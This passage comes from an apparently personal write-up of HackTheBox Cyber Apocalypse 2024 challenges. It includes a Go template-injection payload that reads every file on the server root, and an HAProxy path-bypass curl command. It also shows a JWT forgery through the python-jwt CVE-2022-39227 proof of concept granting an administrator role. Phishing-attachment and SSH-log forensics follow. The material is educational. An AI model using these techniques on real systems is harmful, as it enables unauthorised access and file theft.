+</span></span><span class="line"><span class="cl"><span class="nt">&#34;testimonial&#34;</span><span class="p">:</span> <span class="s2">&#34;package home\n\nimport (\n \&#34;htbchal/view/layout\&#34;\n \&#34;io/fs\&#34; \n \&#34;fmt\&#34;\n \&#34;os\&#34;\n)\n\ntempl Index() {\n @layout.App(true) {\n&lt;nav class=\&#34;navbar navbar-expand-lg navbar-dark bg-black\&#34;&gt;\n &lt;div class=\&#34;container-fluid\&#34;&gt;\n &lt;a class=\&#34;navbar-brand\&#34; href=\&#34;/\&#34;&gt;The Fray&lt;/a&gt;\n &lt;button class=\&#34;navbar-toggler\&#34; type=\&#34;button\&#34; data-toggle=\&#34;collapse\&#34; data-target=\&#34;#navbarNav\&#34;\n aria-controls=\&#34;navbarNav\&#34; aria-expanded=\&#34;false\&#34; aria-label=\&#34;Toggle navigation\&#34;&gt;\n &lt;span class=\&#34;navbar-toggler-icon\&#34;&gt;&lt;/span&gt;\n &lt;/button&gt;\n &lt;div class=\&#34;collapse navbar-collapse\&#34; id=\&#34;navbarNav\&#34;&gt;\n &lt;ul class=\&#34;navbar-nav ml-auto\&#34;&gt;\n &lt;li class=\&#34;nav-item active\&#34;&gt;\n &lt;a class=\&#34;nav-link\&#34; href=\&#34;/\&#34;&gt;Home&lt;/a&gt;\n &lt;/li&gt;\n &lt;li class=\&#34;nav-item\&#34;&gt;\n &lt;a class=\&#34;nav-link\&#34; href=\&#34;javascript:void();\&#34;&gt;Factions&lt;/a&gt;\n &lt;/li&gt;\n &lt;li class=\&#34;nav-item\&#34;&gt;\n &lt;a class=\&#34;nav-link\&#34; href=\&#34;javascript:void();\&#34;&gt;Trials&lt;/a&gt;\n &lt;/li&gt;\n &lt;li class=\&#34;nav-item\&#34;&gt;\n &lt;a class=\&#34;nav-link\&#34; href=\&#34;javascript:void();\&#34;&gt;Contact&lt;/a&gt;\n &lt;/li&gt;\n &lt;/ul&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n&lt;/nav&gt;\n\n&lt;div class=\&#34;container\&#34;&gt;\n &lt;section class=\&#34;jumbotron text-center\&#34;&gt;\n &lt;div class=\&#34;container mt-5\&#34;&gt;\n &lt;h1 class=\&#34;display-4\&#34;&gt;Welcome to The Fray&lt;/h1&gt;\n &lt;p class=\&#34;lead\&#34;&gt;Assemble your faction and prove you\&#34;re the last one standing!&lt;/p&gt;\n &lt;a href=\&#34;javascript:void();\&#34; class=\&#34;btn btn-primary btn-lg\&#34;&gt;Get Started&lt;/a&gt;\n &lt;/div&gt;\n &lt;/section&gt;\n\n &lt;section class=\&#34;container mt-5\&#34;&gt;\n &lt;h2 class=\&#34;text-center mb-4\&#34;&gt;What Others Say&lt;/h2&gt;\n &lt;div class=\&#34;row\&#34;&gt;\n @Testimonials()\n &lt;/div&gt;\n &lt;/section&gt;\n\n\n &lt;div class=\&#34;row mt-5 mb-5\&#34;&gt;\n &lt;div class=\&#34;col-md\&#34;&gt;\n &lt;h2 class=\&#34;text-center mb-4\&#34;&gt;Submit Your Testimonial&lt;/h2&gt;\n &lt;form method=\&#34;get\&#34; action=\&#34;/\&#34;&gt;\n &lt;div class=\&#34;form-group\&#34;&gt;\n &lt;label class=\&#34;mt-2\&#34; for=\&#34;testimonialText\&#34;&gt;Your Testimonial&lt;/label&gt;\n &lt;textarea class=\&#34;form-control mt-2\&#34; id=\&#34;testimonialText\&#34; rows=\&#34;3\&#34; name=\&#34;testimonial\&#34;&gt;&lt;/textarea&gt;\n &lt;/div&gt;\n &lt;div class=\&#34;form-group\&#34;&gt;\n &lt;label class=\&#34;mt-2\&#34; for=\&#34;testifierName\&#34;&gt;Your Name&lt;/label&gt;\n &lt;input type=\&#34;text\&#34; class=\&#34;form-control mt-2\&#34; id=\&#34;testifierName\&#34; name=\&#34;customer\&#34;/&gt;\n &lt;/div&gt;\n &lt;button type=\&#34;submit\&#34; class=\&#34;btn btn-primary mt-4\&#34;&gt;Submit Testimonial&lt;/button&gt;\n &lt;/form&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;footer class=\&#34;bg-black text-white text-center py-3\&#34;&gt;\n &lt;p&gt;&amp;copy; 2024 The Fray. All Rights Reserved.&lt;/p&gt;\n&lt;/footer&gt;\n }\n}\n\nfunc GetTestimonials() []string {\n fsys := os.DirFS(\&#34;/\&#34;) \n files, err := fs.ReadDir(fsys, \&#34;.\&#34;) \n if err != nil {\n return []string{fmt.Sprintf(\&#34;Error reading testimonials: %v\&#34;, err)}\n }\n var res []string\n for _, file := range files {\n fileContent, _ := fs.ReadFile(fsys, file.Name())\n res = append(res, string(fileContent)) \n }\n return res\n}\n\ntempl Testimonials() {\n for _, item := range GetTestimonials() {\n &lt;div class=\&#34;col-md-4\&#34;&gt;\n &lt;div class=\&#34;card mb-4\&#34;&gt;\n &lt;div class=\&#34;card-body\&#34;&gt;\n &lt;p class=\&#34;card-text\&#34;&gt;\&#34;{item}\&#34;&lt;/p&gt;\n &lt;p class=\&#34;text-muted\&#34;&gt;- Anonymous Testifier&lt;/p&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n }\n}\n&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now finally, when we return to the page, the flag is indeed accessed!</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/TestimonyFlag.png"
+	width="1307"
+	height="643"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/TestimonyFlag_hu10271793923731604233.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/TestimonyFlag_hu7953290957243148509.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="203"
+		data-flex-basis="487px"
+	
+>
+<code>HTB{w34kly_t35t3d_t3mplate5}</code></p>
+<h3 id="locktalk">LockTalk
+</h3><p>Difficulty: Medium</p>
+<blockquote>
+<p>In &ldquo;The Ransomware Dystopia,&rdquo; LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization&rsquo;s mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.</p>
+</blockquote>
+<hr>
+<p>The first interesting section for this challenge is actually in <code>conf/haproxy.cfg</code>. The conf folder usually has nothing interesting, so it could be easy to overlook completely.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">global
+</span></span><span class="line"><span class="cl">    daemon
+</span></span><span class="line"><span class="cl">    maxconn 256
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">defaults
+</span></span><span class="line"><span class="cl">    mode http
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    timeout connect 5000ms
+</span></span><span class="line"><span class="cl">    timeout client 50000ms
+</span></span><span class="line"><span class="cl">    timeout server 50000ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">frontend haproxy
+</span></span><span class="line"><span class="cl">    bind 0.0.0.0:1337
+</span></span><span class="line"><span class="cl">    default_backend backend
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">backend backend
+</span></span><span class="line"><span class="cl">    balance roundrobin
+</span></span><span class="line"><span class="cl">    server s1 0.0.0.0:5000 maxconn 32 check
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We see the proxy denies http requests if the path starts with <code>/api/v1/get_ticket</code>. We will see how this comes into play soon.
+Visiting the website, we are shown all the available endpoints:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/tocktalkapi.png"
+	width="916"
+	height="546"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/tocktalkapi_hu14969342382831411848.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/tocktalkapi_hu10257849576385104825.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="167"
+		data-flex-basis="402px"
+	
+></p>
+<p>Getting the flag looks to require a JWT token, and generating a JWT token will result in an error: we are forbidden from visiting, just as defined in the haproxy. However, we have ways around such a restriction. If we were to append something before <code>api</code>, it will not be recognized and blocked. Using a simple <code>.</code> for cwd, we can request the page without traveling. It no longer begins with <code>/api/v1/get_ticket</code>, and so we are able to visit. Most modern browsers will simplify requests and reduce <code>/./</code> out, but we can use Burpsuite to do this:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/burpbypass.png"
+	width="962"
+	height="380"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/burpbypass_hu5030357031548002033.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/burpbypass_hu3790467381505592561.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="253"
+		data-flex-basis="607px"
+	
+></p>
+<p>Alternatively, we can use curl with the <code>--path-as-is</code> flag to keep the <code>/./</code> in the request:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ curl http://83.136.249.253:46008/./api/v1/get_ticket --path-as-is
+</span></span><span class="line"><span class="cl">{&#34;ticket: &#34;:&#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA&#34;}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Despite getting a token, guests cannot view flag:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/flagreject.png"
+	width="835"
+	height="207"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/flagreject_hu5187979450683598723.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/flagreject_hu2224140470668713462.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="403"
+		data-flex-basis="968px"
+	
+></p>
+<p>We can use a JWT decoder to decode and alter our JWT token:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/jwt1.png"
+	width="1195"
+	height="640"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/jwt1_hu7920767545041822592.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/jwt1_hu12448986170472018046.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="186"
+		data-flex-basis="448px"
+	
+></p>
+<p>The encryption does not allow us to edit easily. Fortunately, we might find a <a class="link" href="https://github.com/advisories/GHSA-5p8v-58qm-c7fp"  title="https://github.com/advisories/GHSA-5p8v-58qm-c7fp"
+     target="_blank" rel="noopener"
+    >CVE that highlights a relevant issue</a>. We can send a token as JSON format, including forged content, while providing a valid signature for the untampered token. It will be accepted anyways, and we can access. This CVE was resolved in python-jwt version 3.3.4, so we should check what version this service uses. In the requirements.txt file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat conf/requirements.txt  
+</span></span><span class="line"><span class="cl">uwsgi 
+</span></span><span class="line"><span class="cl">Flask 
+</span></span><span class="line"><span class="cl">requests 
+</span></span><span class="line"><span class="cl">python_jwt==3.3.3
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is specifically 3.3.3, which means it is very likely the intended method. We can find a POC script for the CVE <a class="link" href="https://github.com/user0x1337/CVE-2022-39227"  target="_blank" rel="noopener"
+    >here</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">$</span> <span class="n">python3</span> <span class="n">cve_2022_39227</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">j</span> <span class="s1">&#39;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA&#39;</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;role=administrator&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Retrieved</span> <span class="n">base64</span> <span class="n">encoded</span> <span class="n">payload</span><span class="p">:</span> <span class="n">eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">Example</span> <span class="p">(</span><span class="n">HTTP</span><span class="o">-</span><span class="n">Cookie</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl"><span class="o">------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">auth</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;protected&#34;</span><span class="p">:</span><span class="s2">&#34;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9&#34;</span><span class="p">,</span> <span class="s2">&#34;payload&#34;</span><span class="p">:</span><span class="s2">&#34;eyJleHAiOjE3MTAxNjI0MjcsImlhdCI6MTcxMDE1ODgyNywianRpIjoiM2h4Q2wyQXJYdUhxOUxJVnQtTXVmQSIsIm5iZiI6MTcxMDE1ODgyNywicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ&#34;</span><span class="p">,</span><span class="s2">&#34;signature&#34;</span><span class="p">:</span><span class="s2">&#34;H3vxYVEp-F55Y9jR39ZpJjOBAYgyEReXnovLrDB2tSAFlvW5zifyKnrTF0n29Ck8v_yTmq9w4RgEBoRz4EXZzMeydAK4wVVc9nI3f5p05SG4lRNoVu7b5V0mlLqjjDGDkonyvc7Hveth2WPK0A-0HfjsxbAPHzFy1ZPKXpjHFvOPZXjtUp21JrUtWZlryH77__FCcnTasrGUrj13AhdBWuHXb4xUjDGU_ma-aEbNYW3EO_Uxa16KceP5aHb9ZDmWL4Kjh85Ux82VhX4sqCrVhIx-VhHoif4tDkJ4LF_oDtIm9aOD1x10_qXxZnPtpJMRwU0PeI-Sv02GlvquBHe5WA&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output is a little messy because the token is fat, but the way to use is <code>-j</code> flag to define your valid cookie, then <code>-i</code> flag to supply the tampered information. Here is set role as administrator, and note that unlike the cookie format, I supply as <code>&lt;KEY&gt;=&lt;VALUE&gt;</code>.</p>
+<p>Now when we supply the token (including braces and quotes), we receive the flag!
+<img src="/p/hackthebox-cyber-apocalypse-2024/images/locktalk.png"
+	width="788"
+	height="253"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/locktalk_hu14292102824739400392.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/locktalk_hu17298918815175099791.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="311"
+		data-flex-basis="747px"
+	
+></p>
+<p><code>HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}</code></p>
+<h2 id="forensics">Forensics
+</h2><h3 id="urgent">Urgent
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>In the midst of Cybercity&rsquo;s &ldquo;Fray,&rdquo; a phishing attack targets its factions, sparking chaos. As they decode the email, cyber sleuths race to trace its source, under a tight deadline. Their mission: unmask the attacker and restore order to the city. In the neon-lit streets, the battle for cyber justice unfolds, determining the factions&rsquo; destiny.</p>
+</blockquote>
+<hr>
+<p>In the supplied email, we see a base64 encoded attachment named &ldquo;onlineform.html&rdquo;. Using <code>base64</code>, i decode this through an echo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> echo &#39;PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT48L3RpdGxlPg0KPGJvZHk+DQo8c2NyaXB0IGxhbmd1YWdl
+</span></span><span class="line"><span class="cl"> &lt;...SNIP...&gt;&#39; | base64 -d
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;head&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;script language=&#34;JavaScript&#34; type=&#34;text/javascript&#34;&gt;
+</span></span><span class="line"><span class="cl">document.write(unescape(&#39;%3c%68%74%6d%6c%3e%0d%0a%3c
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">%65%61%64%3e%0d%0a%3c%2f%68%74%6d%6c%3e%0d%0a&#39;));
+</span></span><span class="line"><span class="cl">&lt;/script&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see another large amount of characters displayed as &ldquo;text/javascript&rdquo;. Based on the regular intervals of <code>%</code>, this is clearly URL encoded. Going to cyberchef, we can decode this very simply. Within the decoded contents, we can find our flag:</p>
+<p><img src="/p/hackthebox-cyber-apocalypse-2024/images/urldecode.png"
+	width="953"
+	height="811"
+	srcset="/p/hackthebox-cyber-apocalypse-2024/images/urldecode_hu1741097028030645672.png 480w, /p/hackthebox-cyber-apocalypse-2024/images/urldecode_hu7557656884089909789.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="117"
+		data-flex-basis="282px"
+	
+>
+<code>HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}</code></p>
+<h3 id="an-unusual-sighting">An Unusual Sighting
+</h3><p>Difficulty: Very Easy</p>
+<blockquote>
+<p>As the preparations come to an end, and The Fray draws near each day, our newly established team has started work on refactoring the new CMS application for the competition. However, after some time we noticed that a lot of our work mysteriously has been disappearing! We managed to extract the SSH Logs and the Bash History from our dev server in question. The faction that manages to uncover the perpetrator will have a massive bonus come competition!</p>
+</blockquote>
+<hr>
+<p>The work involves a bash log and ssh server log. Looking at the files, we gather data and answer questions presented through a docker ncat instance. Here is the series of questions with answers:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Note 2: All timestamps are in the format they appear in the logs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What is the IP Address and Port of the SSH Server (IP:PORT)
+</span></span><span class="line"><span class="cl">&gt; 100.107.36.130:2221
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What time is the first successful Login
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; 2024-02-13 11:29:50
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What is the time of the unusual Login
+</span></span><span class="line"><span class="cl">&gt; 2024-02-19 04:00:14
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What is the Fingerprint of the attacker&#39;s public key
+</span></span><span class="line"><span class="cl">&gt; OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What is the first command the attacker executed after logging in
+</span></span><span class="line"><span class="cl">&gt; whoami
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">What is the final command the attacker executed before logging out
+</span></span><span class="line"><span class="cl">&gt; ./setup
+</span></span><span class="line"><span class="cl">[+] Correct!
+</span></span><span class="line"><span class="cl">[+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol>
+<li>What is the IP Address and Port of the SSH Server (IP:PORT)
+Answer:</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ head sshd.log 
+</span></span><span class="line"><span class="cl">[2024-01-19 12:59:11] Server listening on 0.0.0.0 port 2221.
+</span></span><span class="line"><span class="cl">[2024-01-19 12:59:11] Server listening on :: port 2221.
+</span></span><span class="line"><span class="cl">[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain &#34;&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Listening on port 2221, and IP address is disclosed on the first connection log</p>
+<ol start="2">
+<li>What time is the first successful Login
+Answer:</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ grep &#34;Accepted&#34; sshd.log 
+</span></span><span class="line"><span class="cl">[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
+</span></span><span class="line"><span class="cl">[2024-02-15 10:40:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
+</span></span><span class="line"><span class="cl">[2024-02-15 18:51:50] Accepted password for softdev from 101.111.18.92 port 44711 ssh2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>1st time stamp is the first successful login.
+3. What is the time of the unusual Login
+Answer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ grep &#34;Accepted&#34; sshd.log 
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
+</span></span><span class="line"><span class="cl">[2024-02-20 11:10:14] Accepted password for softdev from 100.87.190.253 port 63371 ssh2
+</span></span><span class="line"><span class="cl">[2024-02-21 10:49:50] Accepted password for softdev from 102.11.76.9 port 48875 ssh2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Further down, we see a successful login coming from a strange port <code>2.67.182.119</code> (abnormal time of day as well)
+4. What is the Fingerprint of the attacker&rsquo;s public key
+Answer:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ grep &#39;2.67.182.119&#39; sshd.log 
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:14] Connection from 2.67.182.119 port 60071 on 100.107.36.130 port 2221 rdomain &#34;&#34;
+</span></span><span class="line"><span class="cl">[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When filtering by the abnormal IP address, we can see the publickey is also reported as irregular.
+5. What is the first command the attacker executed after logging in</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
